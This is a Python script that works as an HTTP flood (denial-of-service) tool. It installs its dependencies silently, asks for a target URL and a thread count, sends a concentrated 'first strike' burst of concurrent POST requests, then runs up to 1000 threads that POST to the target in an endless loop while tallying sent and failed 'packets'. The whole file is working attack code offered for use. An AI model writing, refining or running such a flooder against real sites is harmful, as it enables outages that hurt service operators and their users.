import os

# INSTALLING LIBRARIES
import time

iz = '4'

print('\r[~]Installing Libraries...', end='')
print(f'\r[~]Installing Libraries 1/{iz} | numpy   ', end='')
os.system('pip install numpy >nul')
print(f'\r[~]Installing Libraries 2/{iz} | requests', end='')
os.system('pip install requests >nul')
print(f'\r[~]Installing Libraries 3/{iz} | PySocks ', end='')
os.system('pip install PySocks >nul')
print(f'\r[~]Installing Libraries 4/{iz} | PySocks ', end='')
os.system('pip install grequests >nul')
print('\r[+]Libraries installed successfully!      ', end='')
time.sleep(2)
os.system('cls')

# PROGRAMS
import grequests
import requests
import threading
import numpy

url = input('LINK: ')
thread = int(input('THREADS[max: 1000]: '))
strong_first_hit = int(input('STRONG FIRST HIT: '))
if thread > 1000:
    print(f'You have entered more threads than 1000, the value is set to 1000\n')
    thread = 1000

a = 0
for i in range(10):
    response = requests.post(url)
    a += response.elapsed.total_seconds()

sred = round(a/10, 1)
print(f'Средяя скоость ответа сервера - {sred} сек.\n')

if thread == 1000:
    timeout = sred + 1
elif thread >= 500:
    timeout = sred + 0.5
elif thread >= 100:
    timeout = sred + 0.3
elif thread < 100:
    timeout = sred + 0.1

o = 0
b = 0

def first_hit():
    try:
        print('Preparing for the first strike...')
        url_list = [url for i in range(strong_first_hit)]
        grequests.map(grequests.post(spisok) for spisok in url_list)
        print('The first hit was successful!')
    except Exception as e:
        print(f'The first hit caused an error: {str(e)}')
        p = input('To try one more time? (1-Yes; 2-No)')
        if p == '1':
            first_hit()
        else:
            print('I connect small')
            time.sleep(3)
            os.system('cls')
first_hit()

def att():
    global o
    global b
    while True:
        try:
            requests.post(url, timeout=timeout)
            o += 1
        except:
            b += 1
        print(f'\rSECUSSEFUL PACKET SEND - {o} || FAILED SEND PACKET - {b}', end='')

for i in numpy.arange(thread):
    threading.Thread(target=att).start()
